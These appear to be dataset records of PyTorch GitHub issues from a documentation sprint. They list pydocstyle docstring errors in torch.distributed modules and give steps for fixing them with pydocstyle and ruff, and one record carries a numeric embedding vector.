- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/graph_utils.py`, **Entity**: `is_leaf_subgraph`, **Line**: 67, **Description**: First line should end with a period (not '
- **Error Code**: **D401**, **File**: `torch/distributed/_spmd/graph_utils.py`, **Entity**: `is_leaf_subgraph`, **Line**: 67, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D202**, **File**: `torch/distributed/_spmd/graph_utils.py`, **Entity**: `clone_subgraph`, **Line**: 87, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/graph_utils.py`, **Entity**: `clone_subgraph`, **Line**: 87, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D202**, **File**: `torch/distributed/_spmd/graph_utils.py`, **Entity**: `rebuild_graph`, **Line**: 127, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/graph_utils.py`, **Entity**: `rebuild_graph`, **Line**: 127, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/_spmd/graph_utils.py`, **Entity**: `rebuild_graph`, **Line**: 127, **Description**: First line should be in imperative mood (perhaps 'Run', not 'Runs')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/iter_graph_module.py`, **Entity**: `IterGraph`, **Line**: 24, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/iter_graph_module.py`, **Entity**: `IterGraph`, **Line**: 24, **Description**: First line should end with a period (not '`')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/iter_graph_module.py`, **Entity**: `_forward_subgraph_inputs`, **Line**: 129, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/iter_graph_module.py`, **Entity**: `_forward_subgraph_inputs`, **Line**: 129, **Description**: First line should end with a period (not 't')
- **Error Code**: **D401**, **File**: `torch/distributed/_spmd/iter_graph_module.py`, **Entity**: `_forward_subgraph_inputs`, **Line**: 129, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/iter_graph_module.py`, **Entity**: `_forward_inputs_to_subgraph`, **Line**: 221, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/iter_graph_module.py`, **Entity**: `_forward_inputs_to_subgraph`, **Line**: 221, **Description**: First line should end with a period (not 'o')
- **Error Code**: **D401**, **File**: `torch/distributed/_spmd/iter_graph_module.py`, **Entity**: `_forward_inputs_to_subgraph`, **Line**: 221, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/iter_graph_module.py`, **Entity**: `move_to_next_iter_before`, **Line**: 277, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/iter_graph_module.py`, **Entity**: `IterGraphModule`, **Line**: 635, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/iter_graph_module.py`, **Entity**: `finalize_setup`, **Line**: 676, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/iter_graph_module.py`, **Entity**: `finalize_setup`, **Line**: 676, **Description**: First line should end with a period (not 's')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/distribute.py`, **Entity**: `DSymInt`, **Line**: 48, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/distribute.py`, **Entity**: `DSymInt`, **Line**: 48, **Description**: First line should end with a period (not 't')
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/distribute.py`, **Entity**: `_is_partial_dtensor`, **Line**: 90, **Description**: First line should end with a period (not 'l')
- **Error Code**: **D403**, **File**: `torch/distributed/_spmd/distribute.py`, **Entity**: `_is_partial_dtensor`, **Line**: 90, **Description**: First word of the first line should be properly capitalized ('Check', not 'check')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/distribute.py`, **Entity**: `_build_dummy_add_graph`, **Line**: 458, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/_spmd/distribute.py`, **Entity**: `_build_dummy_add_graph`, **Line**: 458, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/distribute.py`, **Entity**: `_convert_to_distributed`, **Line**: 686, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/distribute.py`, **Entity**: `_convert_to_distributed`, **Line**: 686, **Description**: First line should end with a period (not '
- **Error Code**: **D401**, **File**: `torch/distributed/_spmd/distribute.py`, **Entity**: `_convert_to_distributed`, **Line**: 686, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/api.py`, **Entity**: `Override`, **Line**: 35, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/api.py`, **Entity**: `replacement`, **Line**: 50, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/api.py`, **Entity**: `replacement`, **Line**: 50, **Description**: First line should end with a period (not 'o')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/api.py`, **Entity**: `transform`, **Line**: 70, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/api.py`, **Entity**: `transform`, **Line**: 70, **Description**: First line should end with a period (not ',')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/api.py`, **Entity**: `_to_caller_flattened_graph_module`, **Line**: 101, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/api.py`, **Entity**: `_to_caller_flattened_graph_module`, **Line**: 101, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D412**, **File**: `torch/distributed/_spmd/api.py`, **Entity**: `_to_caller_flattened_graph_module`, **Line**: 101, **Description**: No blank lines allowed between a section header and its content ('Example')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/api.py`, **Entity**: `compile`, **Line**: 497, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/api.py`, **Entity**: `compile`, **Line**: 497, **Description**: First line should end with a period (not 'g')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/batch_dim_utils.py`, **Entity**: `BatchDimAnalyzer`, **Line**: 23, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/batch_dim_utils.py`, **Entity**: `BatchDimAnalyzer`, **Line**: 23, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D200**, **File**: `torch/distributed/_spmd/batch_dim_utils.py`, **Entity**: `init_batch_dim_size`, **Line**: 57, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/batch_dim_utils.py`, **Entity**: `init_batch_dim_size`, **Line**: 57, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D403**, **File**: `torch/distributed/_spmd/batch_dim_utils.py`, **Entity**: `init_batch_dim_size`, **Line**: 57, **Description**: First word of the first line should be properly capitalized ('Initialize', not 'initialize')
- **Error Code**: **D200**, **File**: `torch/distributed/_spmd/batch_dim_utils.py`, **Entity**: `compute_batch_dim`, **Line**: 77, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/batch_dim_utils.py`, **Entity**: `compute_batch_dim`, **Line**: 77, **Description**: First line should end with a period (not '`')
- **Error Code**: **D403**, **File**: `torch/distributed/_spmd/batch_dim_utils.py`, **Entity**: `compute_batch_dim`, **Line**: 77, **Description**: First word of the first line should be properly capitalized ('Compute', not 'compute')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/batch_dim_utils.py`, **Entity**: `compute_act_spec`, **Line**: 171, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/batch_dim_utils.py`, **Entity**: `compute_act_spec`, **Line**: 171, **Description**: First line should end with a period (not ',')
- **Error Code**: **D401**, **File**: `torch/distributed/_spmd/batch_dim_utils.py`, **Entity**: `compute_act_spec`, **Line**: 171, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `DataParallelStyle`, **Line**: 44, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `DataParallelStyle`, **Line**: 44, **Description**: First line should end with a period (not '
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `NodeType`, **Line**: 67, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `DataParallelStrategy`, **Line**: 80, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `DataParallelStrategy`, **Line**: 80, **Description**: First line should end with a period (not 's')
- **Error Code**: **D202**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `gradients_tagging`, **Line**: 116, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `gradients_tagging`, **Line**: 116, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `gradients_tagging`, **Line**: 116, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `gradients_tagging`, **Line**: 116, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D200**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `_gen_shard_strategy`, **Line**: 138, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `_gen_shard_strategy`, **Line**: 138, **Description**: First line should end with a period (not 'm')
- **Error Code**: **D403**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `_gen_shard_strategy`, **Line**: 138, **Description**: First word of the first line should be properly capitalized ('Util', not 'util')
- **Error Code**: **D200**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `_gen_replicate_strategy`, **Line**: 150, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `_gen_replicate_strategy`, **Line**: 150, **Description**: First line should end with a period (not 'y')
- **Error Code**: **D403**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `_gen_replicate_strategy`, **Line**: 150, **Description**: First word of the first line should be properly capitalized ('Util', not 'util')
- **Error Code**: **D200**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `_gen_partial_strategy`, **Line**: 160, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `_gen_partial_strategy`, **Line**: 160, **Description**: First line should end with a period (not 'y')
- **Error Code**: **D403**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `_gen_partial_strategy`, **Line**: 160, **Description**: First word of the first line should be properly capitalized ('Util', not 'util')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `build_data_parallel_strategies`, **Line**: 183, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `build_data_parallel_strategies`, **Line**: 183, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D401**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `build_data_parallel_strategies`, **Line**: 183, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D200**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `mark_data_parallel_shardings`, **Line**: 521, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `mark_data_parallel_shardings`, **Line**: 521, **Description**: First line should end with a period (not 'h')
- **Error Code**: **D401**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `mark_data_parallel_shardings`, **Line**: 521, **Description**: First line should be in imperative mood; try rephrasing (found 'This')
- **Error Code**: **D200**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `_partition_val`, **Line**: 604, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `_partition_val`, **Line**: 604, **Description**: First line should end with a period (not 't')
- **Error Code**: **D403**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `_partition_val`, **Line**: 604, **Description**: First word of the first line should be properly capitalized ('Util', not 'util')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `partitioner`, **Line**: 632, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `partitioner`, **Line**: 632, **Description**: First line should end with a period (not 'h')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `partition_data_parallel`, **Line**: 765, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `partition_data_parallel`, **Line**: 765, **Description**: First line should end with a period (not 'l')
- **Error Code**: **D401**, **File**: `torch/distributed/_spmd/data_parallel.py`, **Entity**: `partition_data_parallel`, **Line**: 765, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `graph_optimization_pass`, **Line**: 66, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `graph_optimization_pass`, **Line**: 66, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `graph_optimization_pass`, **Line**: 66, **Description**: First line should be in imperative mood; try rephrasing (found 'The')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `get_comm_block`, **Line**: 160, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `get_comm_block`, **Line**: 160, **Description**: First line should end with a period (not 'o')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `_scatter_wait_result`, **Line**: 308, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `_scatter_wait_result`, **Line**: 308, **Description**: First line should end with a period (not '-')
- **Error Code**: **D200**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `_fuse_with_cat`, **Line**: 373, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `comm_fusion_with_concat`, **Line**: 476, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D200**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `schedule_comm_wait`, **Line**: 510, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `remove_copy_from_optimizer`, **Line**: 551, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D200**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `get_fused_optimizer_block`, **Line**: 744, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `get_all_fused_optimizer_blocks`, **Line**: 785, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `get_all_fused_optimizer_blocks`, **Line**: 785, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `_split_fused_adam`, **Line**: 801, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `_split_fused_adam`, **Line**: 801, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D205**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `iter_move_grads_and_optimizers`, **Line**: 951, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `iter_move_grads_and_optimizers`, **Line**: 951, **Description**: First line should be in imperative mood; try rephrasing (found 'Function')
- **Error Code**: **D202**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `find_all_descendants`, **Line**: 984, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D400**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `find_all_descendants`, **Line**: 984, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D401**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `find_all_descendants`, **Line**: 984, **Description**: First line should be in imperative mood (perhaps 'Identify', not 'identifying')
- **Error Code**: **D403**, **File**: `torch/distributed/_spmd/graph_optimization.py`, **Entity**: `find_all_descendants`, **Line**: 984, **Description**: First word of the first line should be properly capitalized ('Identifying', not 'identifying')

cc @carljparker",False,"[-0.3950947  -0.18347037 -0.08682118 -0.27354506 -0.05983371 -0.23254402
 -0.18237251  0.13747796 -0.5089824   0.04061733  0.06300241 -0.01098208
  0.01629142  0.2514506  -0.11195461  0.10703409 -0.22835056 -0.16246524
  0.17315537  0.03800494  0.08359464  0.3198098  -0.23012796  0.15568411
 -0.20005694  0.02614452 -0.2809024  -0.23818818  0.09968643 -0.01138141
  0.38134146  0.24875118 -0.20703165 -0.14786392  0.27121037  0.21432099
 -0.30636454 -0.18951297  0.1133289   0.11084269 -0.07801579 -0.05690236
 -0.05178623 -0.07854605 -0.08800379 -0.26588824 -0.14009896  0.16761011
 -0.18020701  0.08667001 -0.14947389  0.01371242 -0.36655897 -0.18037245
  0.17849979 -0.154505   -0.14467949  0.5155157  -0.07867058 -0.14504948
  0.0981696   0.09679611  0.1279046   0.56612265 -0.17705844  0.31231567
  0.12783828  0.01538119  0.337489    0.04991226 -0.15400787  0.0087987
 -0.67210174 -0.19790874  0.07154787  0.32886687 -0.27546072  0.12429938
 -0.22673887 -0.3091479  -0.30401373  0.00287204  0.05042632 -0.02573706
 -0.05942477 -0.16022916  0.07436855  0.06730056  0.0414439  -0.1050526
  0.72609794  0.15787607 -0.04808923  0.3953793   0.19617125  0.34043983
  0.18982303  0.03775758 -0.03656653 -0.30842096  0.02148819 -0.23638666
 -0.18376014  0.10951283  0.15124713  0.09407021  0.14645372 -0.15669021
  0.2819903  -0.02708246  0.15453687  0.00511963  0.4542903   0.06799128
  0.29912487  0.06378001 -0.20234706 -0.08298571 -0.23681419  0.09142257
 -0.05302896  0.18656132  0.04678405  0.14873534  0.13297698  0.0430542
  0.37361294  0.0677539   0.08930525 -0.01896908  0.12869145 -0.25560033
  0.04349643  0.19885002  0.4988642  -0.05139371 -0.4930758  -0.49977028
 -0.01835283  0.11987053 -0.3588814  -0.13676201 -0.26292363 -0.32938552
  0.45942506  0.530775   -0.22171663  0.3154293   0.0231821  -0.043755
  0.02435838 -0.03225069 -0.12770522  0.3649214   0.28937995  0.02589279
  0.43536758  0.16764003  0.08647296 -0.36207467 -0.15202281  0.20304182
 -0.25942937  0.12533563 -0.29729968  0.16110119 -0.40710777 -0.06985288
 -0.30755895 -0.00123491  0.01008055  0.15090552 -0.03085511 -0.03452775
  0.279276    0.02160973 -0.25446057 -0.44406462 -0.03835127  0.1794096
 -0.05478697  0.49172735  0.16452575 -0.05219413 -0.08689544  0.13306655
  0.27334973  0.050235    0.15506962  0.35102028 -0.17651808 -0.14448449
  0.2782967   0.00200902 -0.18831    -0.02091653  0.5687625   0.5101663
  0.13365787  0.0325996  -0.02446648  0.00394165  0.3225366   0.06172144
  0.2656853  -0.2527365  -0.2365243  -0.28889802 -0.57557404  0.14035387
 -0.34846807 -0.06570346 -0.14478028 -0.3467589  -0.18022683  0.6892602
  0.20669729 -0.1851595   0.10853126 -0.15514213 -0.0434806   0.07248823
  0.02931321 -0.2733013   0.1031116  -0.05380864 -0.07088737  0.197581
 -0.08287278 -0.05548503 -0.03268253 -0.2981683   0.6078056  -0.0771828
  0.2558599   0.01279054  0.15515678 -0.1720519   0.0767021   0.30638334
 -0.07965276  0.0623662   0.08705544  0.00726943  0.21730049 -0.20803832
 -0.25463685 -0.09915239 -0.38917005  0.16216195 -0.29836157 -0.7066952
  0.13442104 -0.13453446  0.41080606  0.1272131  -0.5177281  -0.03200816
  0.16724515  0.17799929 -0.02093317  0.29148751 -0.08394119  0.45456207
  0.26692465 -0.1717214  -0.3619075   0.1137006   0.02889466 -0.01678521
  0.08498769 -0.59287727  0.26294264  0.26075324  0.3181883   0.27672237
  0.42983228  0.08260541  0.03248541  0.04268816 -0.14675741  0.59769857
 -0.37046105 -0.00977933  0.19363834 -0.16291827 -0.33441162 -0.2596031
 -0.46217275  0.00924842 -0.34737182 -0.07358392  0.25595224 -0.02726369
 -0.01074192  0.10142423  0.1987728   0.07764625  0.43407845 -0.0836095
 -0.48094082 -0.01686292  0.10808422  0.32721394  0.1054544   0.23276068
  0.32421023  0.22660337  0.07147418 -0.5947447   0.5266494   0.17549895
 -0.2891088   0.12394533 -0.05197512  0.03354786 -0.04980412  0.5109493
  0.49488604 -0.00525363 -0.01262944 -0.5429975  -0.31200165  0.06772713
  0.12327486 -0.14619443 -0.48225296  0.04698498 -0.43751287 -0.24328768
  0.2757808   0.10806805 -0.01687233  0.14809813 -0.10422861  0.03789417
 -0.1922102   0.08574151  0.06879169 -0.3613695  -0.25383905 -0.047598
  0.19912043 -0.5161722  -0.19445315  0.08301571  0.2925316   0.2145621
 -0.36338544 -0.33168432  0.26840806 -0.18329495 -0.48435885  0.03830456
  0.17375198  0.23383495  0.00079565  0.17800373 -0.08182468  0.2898562
 -0.5173023  -0.1333579  -0.17633417 -0.3267945   0.26930934 -0.268938
 -0.21421906 -0.03367829  0.04793844  0.12679842 -0.20015109  0.08878528
  0.04717743  0.18533053  0.3003533   0.06248926  0.07446212  0.13932951
 -0.17042622 -0.21914752 -0.3323831   0.40063915  0.44714722 -0.35100472]"
"Fix docstring errors in _init_utils.py, flat_param.py module: docs triaged medium docathon-h2-2023","Please fix the following issues.
First, make sure to install the required tools:
```
pip3 install pydocstyle
```
```
pip3 install ruff
```
Then complete the followings steps:
 1. Run `pydocstyle` to see the number of errors in the file: 
 ```
pydocstyle path-to-file --count
```
 &nbsp; &nbsp; This command prints out the number of errors at the end of the output. Save this output to later add it to your PR description.
2. Next, run `ruff` which should help autofix many of these errors:
```
ruff --select RULECODE --fix path_to_file
```
&nbsp; &nbsp; `RULECODE` is the error code from the output in the issue, for example, **D200**. See the complete list of rules and autofixes [here](https://docs.astral.sh/ruff/rules/#pydocstyle-d).
3. You can run the above command with the `--unsafe-fixes` option. Double-check that the applied fixes are correct.
4. Fix the remaining issues. Fix **only** the errors listed in the issue. Skip the 'Missing docstrings' errors.
5. Run pydocstyle again:
```
pydocstyle path-to-file --count
```
This **number might not be 0** which is **OK**. Add the count of fixed errors to your PR description. 
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `FlatParameter`, **Line**: 188, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `FlatParameter`, **Line**: 188, **Description**: First line should end with a period (not 's')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_init_metadata`, **Line**: 359, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_init_metadata`, **Line**: 359, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_init_metadata`, **Line**: 359, **Description**: First line should be in imperative mood (perhaps 'Initialize', not 'Initializes')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `FlatParamHandle`, **Line**: 425, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `FlatParamHandle`, **Line**: 425, **Description**: First line should end with a period (not 's')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_init_flat_param_and_metadata`, **Line**: 546, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_init_flat_param_and_metadata`, **Line**: 546, **Description**: First line should end with a period (not 'h')
- **Error Code**: **D200**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_validate_tensors_to_flatten`, **Line**: 687, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_validate_tensors_to_flatten`, **Line**: 687, **Description**: First line should be in imperative mood (perhaps 'Validate', not 'Validates')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `flatten_tensors`, **Line**: 730, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `flatten_tensors`, **Line**: 730, **Description**: First line should end with a period (not 'g')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_init_param_reduce_dtypes`, **Line**: 787, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_init_param_reduce_dtypes`, **Line**: 787, **Description**: First line should end with a period (not 's')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `shard`, **Line**: 820, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `shard`, **Line**: 820, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_init_shard_metadata`, **Line**: 855, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_init_shard_metadata`, **Line**: 855, **Description**: First line should end with a period (not 't')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_init_shard_metadata`, **Line**: 855, **Description**: First line should be in imperative mood (perhaps 'Initialize', not 'Initializes')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_shard_metadata`, **Line**: 897, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_shard_metadata`, **Line**: 897, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_shard_metadata`, **Line**: 897, **Description**: First line should be in imperative mood (perhaps 'Compute', not 'Computes')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_unpadded_shard`, **Line**: 960, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_unpadded_shard`, **Line**: 960, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_unpadded_shard`, **Line**: 960, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_shard`, **Line**: 987, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_shard`, **Line**: 987, **Description**: First line should end with a period (not 'd')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_shard`, **Line**: 987, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_sharded_size`, **Line**: 1004, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_sharded_size`, **Line**: 1004, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/distributed/fsdp/flat_param.py`, **Entity**: `_get_sharded_size`, **Line**: 1004, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
